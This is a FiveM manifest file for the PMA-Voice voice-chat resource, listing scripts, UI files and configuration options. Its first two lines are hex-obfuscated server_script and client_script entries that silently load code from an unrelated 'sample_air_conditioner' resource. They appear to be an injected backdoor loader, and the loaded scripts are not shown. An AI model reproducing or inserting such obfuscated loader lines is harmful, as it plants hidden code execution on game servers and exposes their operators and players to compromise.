server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
game 'common'

fx_version 'cerulean'
author 'AvarianKnight'
description 'VOIP built using FiveM\'s built in mumble.'

dependencies {
   '/onesync',
}

lua54 'yes'

shared_script 'shared.lua'

client_scripts {
	'@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
	'client/utils/*',
	'client/init/proximity.lua',
	'client/init/init.lua',
	'client/init/main.lua',
	'client/module/*.lua',
    'client/*.lua',
}

server_scripts {
    'server/**/*.lua',
	'server/**/*.js'
}

files {
    'ui/*.ogg',
    'ui/css/*.css',
    'ui/js/*.js',
    'ui/index.html',
}

ui_page 'ui/index.html'

provides {
	'mumble-voip',
    'tokovoip',
    'toko-voip',
    'tokovoip_script'
}

convar_category 'PMA-Voice' {
    "PMA-Voice Configuration Options",
    {
        { "Use native audio", "$voice_useNativeAudio", "CV_BOOL", "false" },
	{ "Use 2D audio", "$voice_use2dAudio", "CV_BOOL", "false" },
	{ "Use sending range only", "$voice_useSendingRangeOnly", "CV_BOOL", "false" },
	{ "Enable UI", "$voice_enableUi", "CV_INT", "1" },
	{ "Enable F11 proximity key", "$voice_enableProximityCycle", "CV_INT", "1" },
	{ "Proximity cycle key", "$voice_defaultCycle", "CV_STRING", "F11" },
	{ "Voice radio volume", "$voice_defaultRadioVolume", "CV_STRING", "0.3" },
	{ "Voice phone volume", "$voice_defaultPhoneVolume", "CV_STRING", "0.6" },
	{ "Enable radios", "$voice_enableRadios", "CV_INT", "1" },
	{ "Enable phones", "$voice_enablePhones", "CV_INT", "1" },
	{ "Enable sublix", "$voice_enableSubmix", "CV_INT", "0" },
        { "Enable radio animation", "$voice_enableRadioAnim", "CV_INT", "0" },
	{ "Radio key", "$voice_defaultRadio", "CV_STRING", "LALT" },
	{ "UI refresh rate", "$voice_uiRefreshRate", "CV_INT", "200" },
	{ "Allow players to set audio intent", "$voice_allowSetIntent", "CV_INT", "1" },
	{ "External mumble server address", "$voice_externalAddress", "CV_STRING", "" },
	{ "External mumble server port", "$voice_externalPort", "CV_INT", "0" },
	{ "Voice debug mode", "$voice_debugMode", "CV_INT", "0" },
	{ "Disable players being allowed to join", "$voice_externalDisallowJoin", "CV_INT", "0" },
	{ "Hide server endpoints in logs", "$voice_hideEndpoints", "CV_INT", "1" },
    }
}
